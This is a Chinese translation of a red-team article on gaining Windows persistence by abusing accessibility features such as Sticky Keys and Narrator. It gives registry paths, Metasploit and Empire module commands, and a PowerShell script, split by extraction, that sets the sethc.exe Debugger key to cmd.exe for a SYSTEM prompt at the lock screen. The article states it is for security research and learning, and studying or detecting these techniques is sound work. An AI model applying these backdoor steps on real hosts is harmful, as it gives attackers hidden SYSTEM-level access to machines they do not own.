# Window权限维持（十二）：辅助功能

来源: 03-干货系列\Window权限维持整理\Window权限维持（十二）：辅助功能.pdf

辅助功能提供了其他选项（屏幕键盘、放大镜、屏幕阅读等），可以帮助残疾人更轻松地使用
Windows操作系统但是，此功能可能会被滥用，以在已启用RDP且已获得管理员级别权限的主机上实
现持久性。此技术涉及磁盘，或者需要修改注册表才能执行存储的远程负载。
通过辅助功能实现持久性的最简单方法是用合法的cmd.exe或任何其他有效负载替换粘滞键
（sethc.exe）的二进制文件。
持久性–粘滞键二进制替换
按住Shift键5次将启用粘滞键，并且将执行恶意sethc.exe而不是合法的sethc.exe，这将提供提升的会
话或提升的（SYSTEM）命令提示符。

持久性–粘键CMD
Narrator
 
在Windows 10操作系统中，“Narrator”是一个屏幕阅读应用程序，可以帮助人们解决可见性问题。
Giulio Comi发现执行叙述者时可以修改注册表以创建无文件的持久性。在实施此技术之前，Giulio建
议对主机进行一系列修改，以自动启动Narator并减少噪音。建议以下设置：

Narator设置
此技术首先在他的博客中得到了证明，它包括两个部分：
1. 删除“ DelegateExecute ”注册表项
2. 修改“ 默认 ”注册表项以执行命令。
这两个项都存储在以下注册表位置下：
Narator–注册表项
一旦执行“Narrator Provide Feedback”命令，即可使用Metasploit Web传递模块捕获会话。
Computer\HKEY_CURRENT_USER\Software\Classes\AppXypsaf9f1qserqevf0sws76dx4k9a5206
\Shell\open\command

Meterpreter – Narrator
Metasploit
 
Metasploit框架提供了一个利用后的模块，该模块可用于自动化粘性键的持久性技术。该模块将用
CMD替换所选的辅助功能二进制文件（sethc，osk，disp，utilman）。
Metasploit –粘键模块
当目标主机上的屏幕被锁定时，执行utilman实用程序将打开具有系统级特权的命令提示符。
use post/windows/manage/sticky_keys

命令提示符–粘贴键实用程序
此技术需要提升的Meterpreter会话，并且系统必须启用远程桌面协议。在大多数组织中，默认情况下
启用此协议，以便管理员为用户提供支持并在主机上远程执行任务。如果没有，则可以通过以下
Metasploit模块启用RDP：
Metasploit –启用RDP模块
use post/windows/manage/enable_rdp

用恶意负载替换其中一种可访问性功能二进制文件将返回Meterpreter会话，而不是具有系统级特权的
CMD。
Metasploit – Meterpreter有效载荷
Empire
 
类似于Metasploit框架，PowerShell Empire具有一个可以实现粘滞键持久性技术的模块。与
Metasploit相比，它支持更多的二进制文件（Narrator，Magnify），而不是用CMD替换二进制文
件，而是修改调试器注册表项，以便存储将执行stager的PowerShell命令。
可以通过此Empire模块将以下二进制文件后门：
设置文件
实用程序
操作系统
讲述人
放大工具
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File 
Execution Options\sethc.exe\Debugger
usemodule persistence/misc/debugger/*

Empire –粘键模块
杂项
 
粘性密钥持久性技术是众所周知的，一些威胁参与者在网络攻击期间正在使用它。在Metasploit和
Empire之外，可以使用脚本来自动执行此方法。Preston Thornburg编写了以下PowerShell脚本，该
脚本可以通过修改注册表来实现持久性。
$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File 
Execution Options\"
$keyName = "sethc.exe"
$stringName = "Debugger"
$binaryValue = "C:\Windows\System32\cmd.exe"
 
IF (Test-Path ($registryPath + $keyName))
{
    # Sticky Keys backdoor exists.
    write-host "Registry key found. Let's remove it."
    #New-Item -Path $registryPath -Name $keyName | Out-Null
    Remove-Item -Path ($registryPath + $keyName) | Out-Null
    write-host "Sticky Key backdoor has been removed."
}
ELSE {
    # Sticky Keys backdoor does not exist, let's add it.
    write-host "Registry key not found. Attempting to add Sticky Keys backdoor 
to registry."
    New-Item -Path $registryPath -Name $keyName | Out-Null

粘滞键PowerShell脚本
实现该技术的其他脚本包括logon_backdoor GitHub项目中的批处理文件和可执行文件。
持久性粘滞键–登录后门批处理版本
选项1将修改“ Debugger ”键，以包括命令提示符的路径。
    New-ItemProperty -Path ($registryPath + $keyName) -Name $stringName -Value 
$binaryValue | Out-Null
    write-host "Sticky Keys backdoor added."
}

持久性粘滞键–登录后门
按住Shift键5次将启用粘滞键，并会在较高的环境中执行CMD。

持久性–登录后门CMD
这两个版本都包含清除选项，该选项删除了“ Debugger ”注册表项。
持久性–后门登录可执行版本
该粘键 GitHub的项目提供了一个额外的选项，这是给系统控制台给用户。但是，此技术的实现与
logon_backdoor项目非常相似。

持久性–粘滞键项目系统控制台
译文声明：本文由Bypass整理并翻译，仅用于安全研究和学习之用。
原文地址：>
